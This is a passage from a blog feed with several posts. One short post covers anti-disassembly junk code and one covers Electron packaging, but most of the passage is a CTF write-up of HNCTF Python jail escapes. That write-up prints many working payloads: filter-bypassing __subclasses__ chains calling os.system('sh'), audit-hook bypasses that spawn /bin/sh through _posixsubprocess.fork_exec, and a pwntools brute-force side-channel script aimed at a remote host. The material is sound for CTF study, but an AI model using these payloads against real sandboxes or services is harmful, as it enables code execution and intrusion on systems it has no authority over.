<h5 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h5><h5 id="In-the-first-test-case-there-is-only-one-query-We-need-to-find-the-sum-of-areas-of-all-rectangles-that-can-fit-a-1×1-rectangle-inside-of-it-and-fit-into-a-3×4-rectangle"><a href="#In-the-first-test-case-there-is-only-one-query-We-need-to-find-the-sum-of-areas-of-all-rectangles-that-can-fit-a-1×1-rectangle-inside-of-it-and-fit-into-a-3×4-rectangle" class="headerlink" title="In the first test case, there is only one query. We need to find the sum of areas of all rectangles that can fit a 1×1 rectangle inside of it and fit into a 3×4 rectangle."></a>In the first test case, there is only one query. We need to find the sum of areas of all rectangles that can fit a 1×1 rectangle inside of it and fit into a 3×4 rectangle.</h5><h5 id="Only-the-2×3-rectangle-works-because-1-lt-2-comparing-heights-and-1-lt-3-comparing-widths-so-the-1×1-rectangle-fits-inside-and-2-lt-3-comparing-heights-and-3-lt-4-comparing-widths-so-it-fits-inside-the-3×4-rectangle-color"><a href="#Only-the-2×3-rectangle-works-because-1-lt-2-comparing-heights-and-1-lt-3-comparing-widths-so-the-1×1-rectangle-fits-inside-and-2-lt-3-comparing-heights-and-3-lt-4-comparing-widths-so-it-fits-inside-the-3×4-rectangle-color" class="headerlink" title="Only the 2×3 rectangle works, because 1&lt;2 (comparing heights) and 1&lt;3 (comparing widths), so the 1×1 rectangle fits inside, and 2&lt;3 (comparing heights) and 3&lt;4 (comparing widths), so it fits inside the 3×4 rectangle. $\color"></a>Only the 2×3 rectangle works, because 1&lt;2 (comparing heights) and 1&lt;3 (comparing widths), so the 1×1 rectangle fits inside, and 2&lt;3 (comparing heights) and 3&lt;4 (comparing widths), so it fits inside the 3×4 rectangle. $\color</h5>]]></content>
      <tags>
        <tag>codeforces</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>junk code demo</title>
    <url>/2023/07/18/junk-code-demo/</url>
    <content><![CDATA[<h6 id="大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把IDA这类线性扫描反汇编和递归下降反汇编弄清楚点，以后IDA抽风的时候也更清楚点为啥"><a href="#大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把IDA这类线性扫描反汇编和递归下降反汇编弄清楚点，以后IDA抽风的时候也更清楚点为啥" class="headerlink" title="大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把IDA这类线性扫描反汇编和递归下降反汇编弄清楚点，以后IDA抽风的时候也更清楚点为啥"></a>大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把IDA这类线性扫描反汇编和递归下降反汇编弄清楚点，<del>以后IDA抽风的时候也更清楚点为啥</del></h6><span id="more"></span>

<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><h6 id="来源于-IDAPro权威指南"><a href="#来源于-IDAPro权威指南" class="headerlink" title="来源于 IDAPro权威指南"></a>来源于 IDAPro权威指南</h6><h5>
<details> <summary>线性扫描反汇编</summary>

<p><img src="/2023/07/18/junk-code-demo/image-20230718011401924.png" alt="image-20230718011401924"></p>
</details>
</h5>

<h5>
<details> <summary>递归下降反汇编</summary>

<p><img src="/2023/07/18/junk-code-demo/image-20230718011457626.png" alt="image-20230718011457626"></p>
<p><img src="/2023/07/18/junk-code-demo/image-20230718011531171.png" alt="image-20230718011531171"></p>
<p><img src="/2023/07/18/junk-code-demo/image-20230718011544013.png" alt="image-20230718011544013"></p>
</details>
</h5>

<h5 id="这里主要看递归下降反汇编方式"><a href="#这里主要看递归下降反汇编方式" class="headerlink" title="这里主要看递归下降反汇编方式"></a>这里主要看递归下降反汇编方式</h5><h5 id="首先明确IDAPro的反汇编均为静态进行。根据条件分支指令可以构造入门的junk-instructions如-jz-jnz-或者永真-x2F-假条件-jz-x2F-jnz类型（注意：后者在构造时需要考虑编译器优化问题）"><a href="#首先明确IDAPro的反汇编均为静态进行。根据条件分支指令可以构造入门的junk-instructions如-jz-jnz-或者永真-x2F-假条件-jz-x2F-jnz类型（注意：后者在构造时需要考虑编译器优化问题）" class="headerlink" title="首先明确IDAPro的反汇编均为静态进行。根据条件分支指令可以构造入门的junk instructions如(jz+jnz)或者永真&#x2F;假条件+jz&#x2F;jnz类型（注意：后者在构造时需要考虑编译器优化问题）"></a>首先明确IDAPro的反汇编均为静态进行。根据条件分支指令可以构造入门的junk instructions如(jz+jnz)或者永真&#x2F;假条件+jz&#x2F;jnz类型（注意：后者在构造时需要考虑编译器优化问题）</h5><h5 id="实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的junk-code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）"><a href="#实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的junk-code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）" class="headerlink" title="实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的junk code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）"></a>实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的junk code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）</h5><h5 id="如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式：用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk-code，使得反汇编失效"><a href="#如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式：用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk-code，使得反汇编失效" class="headerlink" title="如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式：用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk code，使得反汇编失效"></a>如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式：<code>用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk code，使得反汇编失效</code></h5><h5 id="然后，配合一些小小的汇编知识，就可以产生奇妙的效果"><a href="#然后，配合一些小小的汇编知识，就可以产生奇妙的效果" class="headerlink" title="然后，配合一些小小的汇编知识，就可以产生奇妙的效果"></a>然后，配合一些小小的汇编知识，就可以产生奇妙的效果</h5><h5 id="例如，call指令正常情况下不会指向其他call-retn间的地址，但通过asm汇编内联，可以让call指向一个最近的相对地址，同时-不维护条件寄存器-，通过该条件寄存器控制永真逻辑。当调用retn的时候返回call，下面的条件寄存器会重复修改。中间的代码在IDA优化过程中是假逻辑，但构造运行两次后变为永真。（-可能有点抽象，这里写了个小demo-junkCode-x2F-README-md-at-main-·-DeMoYao100-x2F-junkCode-github-com"><a href="#例如，call指令正常情况下不会指向其他call-retn间的地址，但通过asm汇编内联，可以让call指向一个最近的相对地址，同时-不维护条件寄存器-，通过该条件寄存器控制永真逻辑。当调用retn的时候返回call，下面的条件寄存器会重复修改。中间的代码在IDA优化过程中是假逻辑，但构造运行两次后变为永真。（-可能有点抽象，这里写了个小demo-junkCode-x2F-README-md-at-main-·-DeMoYao100-x2F-junkCode-github-com" class="headerlink" title="例如，call指令正常情况下不会指向其他call retn间的地址，但通过asm汇编内联，可以让call指向一个最近的相对地址，同时__不维护条件寄存器__，通过该条件寄存器控制永真逻辑。当调用retn的时候返回call，下面的条件寄存器会重复修改。中间的代码在IDA优化过程中是假逻辑，但构造运行两次后变为永真。（[可能有点抽象，这里写了个小demo](junkCode&#x2F;README.md at main · DeMoYao100&#x2F;junkCode (github.com))"></a>例如，call指令正常情况下不会指向其他call retn间的地址，但通过asm汇编内联，可以让call指向一个最近的相对地址，同时__不维护条件寄存器__，通过该条件寄存器控制永真逻辑。当调用retn的时候返回call，下面的条件寄存器会重复修改。中间的代码在IDA优化过程中是假逻辑，但构造运行两次后变为永真。（[可能有点抽象，这里写了个小demo](<a href="https://github.com/DeMoYao100/junkCode">junkCode&#x2F;README.md at main · DeMoYao100&#x2F;junkCode (github.com)</a>)</h5><h5 id="其实基本上看懂这个demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造rop链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行"><a href="#其实基本上看懂这个demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造rop链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行" class="headerlink" title="其实基本上看懂这个demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造rop链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行"></a>其实基本上看懂这个demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造rop链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行</h5><h5 id="然后是函数指针篡改，感觉一出现ida很容易抽风，基本上就是动调的时候修就行（除非恶意构造）"><a href="#然后是函数指针篡改，感觉一出现ida很容易抽风，基本上就是动调的时候修就行（除非恶意构造）" class="headerlink" title="然后是函数指针篡改，感觉一出现ida很容易抽风，基本上就是动调的时候修就行（除非恶意构造）"></a>然后是函数指针篡改，感觉一出现ida很容易抽风，基本上就是动调的时候修就行（除非恶意构造）</h5><h6 id="最后立个flag，有空把IDA反编译也写一篇ida反编译是真喜欢抽风啊。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助"><a href="#最后立个flag，有空把IDA反编译也写一篇ida反编译是真喜欢抽风啊。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助" class="headerlink" title="最后立个flag，有空把IDA反编译也写一篇ida反编译是真喜欢抽风啊。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助"></a>最后立个flag，有空把IDA反编译也写一篇<del>ida反编译是真喜欢抽风啊</del>。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助</h6>]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>electron 打包</title>
    <url>/2023/09/06/electron-%E6%89%93%E5%8C%85/</url>
    <content><![CDATA[<h6 id="preface：小学期作业新加的需求，原来没玩过，记录一下"><a href="#preface：小学期作业新加的需求，原来没玩过，记录一下" class="headerlink" title="preface：小学期作业新加的需求，原来没玩过，记录一下"></a>preface：小学期作业新加的需求，原来没玩过，记录一下</h6><span id="more"></span>

<p>[参考知乎](<a href="https://zhuanlan.zhihu.com/p/430760821">使用Electron给Python程序加上GUI - 知乎 (zhihu.com)</a>)</p>
<h5 id="1-打包python文件"><a href="#1-打包python文件" class="headerlink" title="1.打包python文件"></a>1.打包python文件</h5><h5 id="2-修改js中调用python的代码"><a href="#2-修改js中调用python的代码" class="headerlink" title="2.修改js中调用python的代码"></a>2.修改js中调用python的代码</h5><h5 id="3-构建文件并打包electron"><a href="#3-构建文件并打包electron" class="headerlink" title="3.构建文件并打包electron"></a>3.构建文件并打包electron</h5><hr>
<h5 id="1-打包python文件-1"><a href="#1-打包python文件-1" class="headerlink" title="1.打包python文件"></a>1.打包python文件</h5><ul>
<li>nuitka打包</li>
</ul>
<p><code>pip install nuitka</code></p>
<p><code>python -m nuitka frontend.py --follow-imports</code> (–follow-imports 会附带打包依赖)</p>
<ul>
<li>pyinstaller</li>
</ul>
<p><code>pyinstaller -F C:\Users\18238\Downloads\packTest\byrFileShare-frontend\client\frontend.py</code></p>
<h5 id="2-修改js中调用python的代码-1"><a href="#2-修改js中调用python的代码-1" class="headerlink" title="2.修改js中调用python的代码"></a>2.修改js中调用python的代码</h5><pre><code class="js">const &#123; spawn &#125; = require(&#39;child_process&#39;);
const python = spawn(&#39;python&#39;, [&#39;\frontend.exe&#39;]);
</code></pre>
<p><img src="/2023/09/06/electron-%E6%89%93%E5%8C%85/image-20230906102010240.png" alt="image-20230906102010240"></p>
<h5 id="3-构建文件并打包electron-1"><a href="#3-构建文件并打包electron-1" class="headerlink" title="3.构建文件并打包electron"></a>3.构建文件并打包electron</h5><p><code>npm install electron --save-dev</code></p>
<p><code>npm init</code></p>
<pre><code class="json"># package.json
&#123;
  &quot;name&quot;: &quot;your-app&quot;,
  &quot;version&quot;: &quot;1.0.0&quot;,
  &quot;main&quot;: &quot;C:/Users/18238/Downloads/packTest/byrFileShare-frontend/frontend/main.js&quot;,
  &quot;scripts&quot;: &#123;
    &quot;start&quot;: &quot;electron .&quot;,
    &quot;package&quot;: &quot;electron-packager ./ test --platform=win32 --arch=x64&quot;
  &#125;,
  &quot;dependencies&quot;: &#123;
    &quot;electron-packager&quot;: &quot;^17.1.2&quot;
  &#125;,
  &quot;devDependencies&quot;: &#123;
    &quot;electron&quot;: &quot;^latest-version&quot;
  &#125;
&#125;
</code></pre>
<p><code>npm run package</code></p>
]]></content>
  </entry>
  <entry>
    <title>pythonJail</title>
    <url>/2022/11/01/pythonJail/</url>
    <content><![CDATA[<h4 id="preface"><a href="#preface" class="headerlink" title="preface"></a>preface</h4><h6 id="Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail"><a href="#Thanks-to-空白crazyman-who-brough-us-so-much-excellent-ctf-exercises-Though-I-didn’t-work-out-many-of-them-that-is-Now-the-HNCTF-has-ended-I-found-some-write-up-about-the-python-jail-problemspythonJail" class="headerlink" title="Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problemspythonJail."></a>Thanks to 空白crazyman, who brough us so much excellent ctf exercises. (Though I didn’t work out many of them that is.) Now the HNCTF has ended, I found some write up  about the python jail problems<a href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">pythonJail</a>.</h6><span id="more"></span>
<h3 id="LEVEL-1"><a href="#LEVEL-1" class="headerlink" title="LEVEL 1"></a>LEVEL 1</h3><p><img src="/2022/11/01/pythonJail/level1.png" alt="level1"></p>
<p>From the function filter, we sees that the symbol [“ ‘ ` i b] is banned. Which means (Show subclasses with tuple) <code> ().\__class\__.\__base\__.\__subclasses\__()</code></p>
<p>is not allowed. What’s more, symbol ‘ and “ is banned, so it come to us that we may can use <code>chr</code> to splicing a string that we wanted.</p>
<p>Two possible payload:</p>
<blockquote>
<p>getattr(getattr(getattr(getattr(()._<em>class_</em>,c),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))<br>(().<em>_class</em><em>.__base</em><em>.__subclasses__()[-4].__init__.__globals</em>_<a href="'sh'">‘system’</a>)</p>
</blockquote>
<blockquote>
<p>open(chr(102)+chr(108)+chr(97)+chr(103)).read()<br>from <a href="https://zhuanlan.zhihu.com/p/578986988">thisBlog</a></p>
</blockquote>
<p><img src="/2022/11/01/pythonJail/level1wp.png" alt="level1pos"></p>
<h3 id="LEVEL-2"><a href="#LEVEL-2" class="headerlink" title="LEVEL 2"></a>LEVEL 2</h3><p><img src="/2022/11/01/pythonJail/level2.png" alt="level1"></p>
<p>The length of the payload is limited to 13.</p>
<p>The answer according to 空白 is the function <c style="color: #FF0000">“breakpoint()”</c>, which I didn’t figure out yet. However, there is another way. Use <code>eval(input())</code> so that the program receive once again for your input! Seems a little bit like <code>/?cmd=system($_POST[1]);$1=ls</code> to escape the filter in php right?</p>
<h3 id="LEVEL-3"><a href="#LEVEL-3" class="headerlink" title="LEVEL 3"></a>LEVEL 3</h3><p><img src="/2022/11/01/pythonJail/level3.png" alt="level3"></p>
<p>This time, the maximum length of our payload is down to 7.</p>
<p>I didn’t quite understand yet, but function <code>help()</code> can help you passby the 7 words limit. Here is when I tried others’ payload, quite amazing and when I am available I shall come back to study it.</p>
<blockquote>
</blockquote>
<p><img src="/2022/11/01/pythonJail/level3wp.png" alt="level3"></p>
<h3 id="PYTHON2-INPUT-JAIL"><a href="#PYTHON2-INPUT-JAIL" class="headerlink" title="PYTHON2 INPUT JAIL"></a>PYTHON2 INPUT JAIL</h3><p><img src="/2022/11/01/pythonJail/input(jail).png" alt="input(jail)"></p>
<p>python2, another thing I am not familiar with…</p>
<p>Looking up others’ write up…</p>
<p><img src="/2022/11/01/pythonJail/input(jail)wp.png" alt="input(jail)"></p>
<h3 id="LEVEL-2-5"><a href="#LEVEL-2-5" class="headerlink" title="LEVEL 2.5"></a>LEVEL 2.5</h3><p><img src="/2022/11/01/pythonJail/level2.5.png" alt="level2.5"></p>
<p>We can use <code>breakpoint()</code> to go into pdb, and rce is possible.</p>
<h3 id="LAKE"><a href="#LAKE" class="headerlink" title="LAKE"></a>LAKE</h3><p><img src="/2022/11/01/pythonJail/lake.png" alt="lake"></p>
<h6 id="Strange-christen-Crazyman-seems-to-name-it-‘lake’-from-‘leak’"><a href="#Strange-christen-Crazyman-seems-to-name-it-‘lake’-from-‘leak’" class="headerlink" title="Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)"></a>Strange christen.(Crazyman seems to name it ‘lake’ from ‘leak’?)</h6><p>Use <code>globals()</code> to leak the key. And then get shell.</p>
<h3 id="L-KE"><a href="#L-KE" class="headerlink" title="L@KE"></a>L@KE</h3><p><img src="/2022/11/01/pythonJail/l@ke.png" alt="l@ke"></p>
<h6 id="Another-strange-christen…"><a href="#Another-strange-christen…" class="headerlink" title="Another strange christen…"></a>Another strange christen…</h6><p>The maxinum length of payload is now 6, so only <code>help()</code> is possible.</p>
<p>But unlike cases above, this time module ‘os’ is destory or whatever. Now we comes to the base reason why we use ‘os’ above. <code>help()</code> can actually get you into any module in the python file, which includes <code>__main__</code>! And surely, the key can be found inside.</p>
<br>
##### OK, now we've go through the first four level( designed by crazyman, that is). From level 5, there provides no source code.
<br>


<h3 id="LEVEL-5"><a href="#LEVEL-5" class="headerlink" title="LEVEL 5"></a>LEVEL 5</h3><p><img src="/2022/11/01/pythonJail/level5.png" alt="level5"></p>
<p>Just rce can give you the flag.(unexpected) Later we will see how it shall really be work out.</p>
<h3 id="LEVEL-4"><a href="#LEVEL-4" class="headerlink" title="LEVEL 4"></a>LEVEL 4</h3><h6 id="Why-is-it-4-after-5-I-don’t-know…"><a href="#Why-is-it-4-after-5-I-don’t-know…" class="headerlink" title="(Why is it 4 after 5 I don’t know…)"></a>(Why is it 4 after 5 I don’t know…)</h6><p>4 bytes rce, seems impossible, so lets just guass it use <code>os.system(input_data)</code> to get your input and bingo.</p>
<p><img src="/2022/11/01/pythonJail/level4.png" alt="level4"></p>
<h3 id="LAkE"><a href="#LAkE" class="headerlink" title="LAkE"></a>LAkE</h3><p><img src="/2022/11/01/pythonJail/laKelaKe.png" alt="laKe"></p>
<p>This time it imports <code>sys</code> module with <a href="https://peps.python.org/pep-0578/">audit hook</a>, and direct RCE function like <code>pty.spawn、os.system、os.exec、os.posix_spawn、os.spawn、subprocess.Popen</code> is not available. Whats more, <code>compile、eval、exec、open</code> is unfetchable. However, there use <code>random.setstate()</code> to generate its random number, which is base on Mersenne <a href="https://zh.wikipedia.org/zh-tw/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95">Twister</a>, and is crackable. In general, if we got the state of the random number generator, we can generate the same number. That leads two problems: There is only one ‘eval’ in the server code, but we need to execute more. How to restore the state BEFORE the random number is generated?</p>
<p>First, we need to know a thing named Assignment Expresions in python, or rather, walrus operator. Then, we package those formula in a list. They will be calculate from left to right. As for function, we can replace it with <code>lambda</code>. Some case can be view below:</p>
<pre><code>https://ctftime.org/writeup/21982

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#operators-and-short-tricks
</code></pre>
<p>Second, if we <code>import random</code> and print <code>random.getstate</code> at the beginning, we got a tuple back. which may look like:<code>(3, (..., 624), None)</code>. The first value ‘3’ and the last value ‘None’ is fixed. Only 624 numbers in the middle is changed. So if we assign the conter zero, we get the random number.</p>
<h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><pre><code>[random:=\_\_import__(&#39;random&#39;), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1]
</code></pre>
<h3 id="LEVEL-5-1"><a href="#LEVEL-5-1" class="headerlink" title="LEVEL 5.1"></a>LEVEL 5.1</h3><p>Dued to the unexpected solves in level5, crazyman gives another problem, stating level5.1.</p>
<p><code>nc</code> and <code>dir()</code>(as it tells you to), found <code>my_flag</code>, try <code>list(getattr(my_flag,&#39;flag))</code>, got a <code>AttributeError: &#39;flag_level5&#39; object has no attribute &#39;flag&#39;</code>. So payload is <code>list(getattr(my_flag,&#39;flag_level5&#39;))</code></p>
<p>Another way to solve this problem(though quite similar, the latter gets its shell)</p>
<p><img src="/2022/11/01/pythonJail/level5.1_1.png" alt="level5.1_1"><br><img src="/2022/11/01/pythonJail/level5.1_2.png" alt="level5.1_2"></p>
<h3 id="LAK3"><a href="#LAK3" class="headerlink" title="LAK3"></a>LAK3</h3><p><img src="/2022/11/01/pythonJail/lak3.png" alt="lak3"></p>
<p>Same as before, we can use the excate same payload. Though the official payload provides by crazyman is <code>__import__(&#39;sys&#39;)._getframe(1).f_locals[&#39;right_guesser_question_answer&#39;]</code></p>
<h5 id="a-good-blog-can-refer"><a href="#a-good-blog-can-refer" class="headerlink" title="a good blog can refer"></a><a href="https://ctftime.org/writeup/21982">a good blog can refer</a></h5><h3 id="tyPe-Ch-nnEl"><a href="#tyPe-Ch-nnEl" class="headerlink" title="tyPe Ch@nnEl"></a>tyPe Ch@nnEl</h3><p><img src="/2022/11/01/pythonJail/sideChannel.png" alt="sideChannel"></p>
<p>I haven’t quite understand yet. So I will put the payload beforehand:</p>
<p>One possible:</p>
<pre><code>from pwn import *
from tqdm import trange

class Gao:
    def __init__(self):
        self.known = &#39;&#39;

def init(self):
    # self.conn = process([&#39;python3&#39;, &#39;./server_type.py&#39;])
    self.conn = remote(&#39;1.14.71.254&#39;, 28563)

def gao(self):
    payload = &#39;((1)if(type(flag.split())(flag.encode()).pop(&#123;pos&#125;)^&#123;val&#125;)else(True))&#39;
    i = len(self.known)
    while True:
        for j in trange(32, 128):
            cur_payload = payload.format(pos=i, val=j)
            self.init()
            self.conn.sendlineafter(&#39;Payload:&#39;, cur_payload)
            s = self.conn.recvline()
            self.conn.close()
            if (b&#39;Try&#39; in s):
                return
            elif (b&#39;bool&#39; in s):
                self.known += chr(j)
                print(self.known)
                print(self.known)
                print(self.known)
                break
        else:
            raise Exception(&#39;GG simida&#39;)            
        i += 1
if __name__ == &#39;__main__&#39;:
    g = Gao()
    g.gao()
</code></pre>
<p>↑ Can took some time(when I tried)</p>
<p>Officail:</p>
<pre><code>for i in range(len(flag), len(flag)+100): # flag length
for guess in chars: # all possible chars
    print(&quot;guess: &quot;, bytes(flag), chr(guess))
    payload = f&quot;type(type(flag).mro())(type(type(flag).mro())(flag).pop(&#123;i&#125;).encode()).remove(&#123;guess&#125;)&quot;
</code></pre>
<h3 id="LEVEL-4-1"><a href="#LEVEL-4-1" class="headerlink" title="LEVEL 4"></a>LEVEL 4</h3><h6 id="level-4-again"><a href="#level-4-again" class="headerlink" title="level 4 again"></a>level 4 again</h6><p><img src="/2022/11/01/pythonJail/level4_1.png" alt="level4_1"></p>
<p>Quite similar as before, just use <code>bytes().decode()</code> to pass the black list.</p>
<p><img src="/2022/11/01/pythonJail/level4wp1.png" alt="level4_1wp1"><br><img src="/2022/11/01/pythonJail/level4wp2.png" alt="level4_1wp2"></p>
<p>payload:</p>
<pre><code>().__class__.__base__.__subclasses__()
</code></pre>
<h5 id><a href="#" class="headerlink" title></a></h5><p>​    ().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[-4].<strong>init</strong>.<strong>globals</strong>[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())</p>
<p>There is another solution to this problem: I am not sure I fully understand it, so I put a <a href="https://zhuanlan.zhihu.com/p/579057932">link</a> here beforehand.</p>
<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
</code></pre>
<p><img src="/2022/11/01/pythonJail/level4wp_3.png" alt="level4wp3"></p>
<h3 id="LEVEL-4-0-5"><a href="#LEVEL-4-0-5" class="headerlink" title="LEVEL 4.0.5"></a>LEVEL 4.0.5</h3><p>Same payload as last one.</p>
<p><img src="/2022/11/01/pythonJail/level4.0.5.png" alt="level4.0.5"></p>
<h3 id="LEVEL-4-1"><a href="#LEVEL-4-1" class="headerlink" title="LEVEL 4.1"></a>LEVEL 4.1</h3><p>Quite same as before.</p>
<p><img src="/2022/11/01/pythonJail/level4.1wp1.png" alt="level4.1"></p>
<p>Ps, the <code>bytes</code> is now banned, but still you can use <code>show subclassed with tuples</code> to replace, like this:</p>
<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
</code></pre>
<h3 id="LEVEL-4-2"><a href="#LEVEL-4-2" class="headerlink" title="LEVEL 4.2"></a>LEVEL 4.2</h3><p>Quite same as before..</p>
<p><img src="/2022/11/01/pythonJail/level4.2wp.png" alt="level4.2"></p>
<h5 id="Or-rather-use-join"><a href="#Or-rather-use-join" class="headerlink" title="Or rather use join:"></a>Or rather use <code>join</code>:</h5><pre><code class="python">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))
</code></pre>
<h3 id="LEVEL-4-3"><a href="#LEVEL-4-3" class="headerlink" title="LEVEL 4.3"></a>LEVEL 4.3</h3><p>Quite same as before…</p>
<p><img src="/2022/11/01/pythonJail/level4.3wp.png" alt="level4.3"></p>
<br>
##### The next few levels are become harder and harder.
<br>

<h3 id="LEVEL-6"><a href="#LEVEL-6" class="headerlink" title="LEVEL 6"></a>LEVEL 6</h3><h4 id="repetition"><a href="#repetition" class="headerlink" title="repetition:"></a>repetition:</h4><p><img src="/2022/11/01/pythonJail/level6wp1.png" alt="level6wp1"><br><img src="/2022/11/01/pythonJail/level6wp2.png" alt="level6wp2"><br><img src="/2022/11/01/pythonJail/level6wp3.png" alt="level6wp3"></p>
<h5 id="link-that-may-help-you"><a href="#link-that-may-help-you" class="headerlink" title="link that may help you"></a><a href="https://ctftime.org/writeup/31883">link that may help you</a></h5><p>The basic idea is to RCE with <code>_posixsubprocess.fork_exec</code>. If we import it directly, it will trigger the audit hook. But we can pass it by using <code>__builtins__[&#39;__loader__&#39;].load_module(&#39;_posixsubprocess&#39;)</code> or <code>__loader__.load_module(&#39;_posixsubprocess&#39;)</code>. Also, due to its repeatedly exct, we just shell like this:</p>
<pre><code>import os
__loader__.load_module(&#39;_posixsubprocess&#39;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
</code></pre>
<h3 id="LEVEL-6-1"><a href="#LEVEL-6-1" class="headerlink" title="LEVEL 6.1"></a>LEVEL 6.1</h3><p>This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works.</p>
<p><img src="/2022/11/01/pythonJail/level6.1wp.png" alt="level6.1wp"></p>
<h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h5><pre><code>[os := __import__(&#39;os&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]
</code></pre>
<h5 id="or"><a href="#or" class="headerlink" title="or"></a>or</h5><pre><code>[os := __import__(&#39;os&#39;), itertools := __loader__.load_module(&#39;itertools&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]
</code></pre>
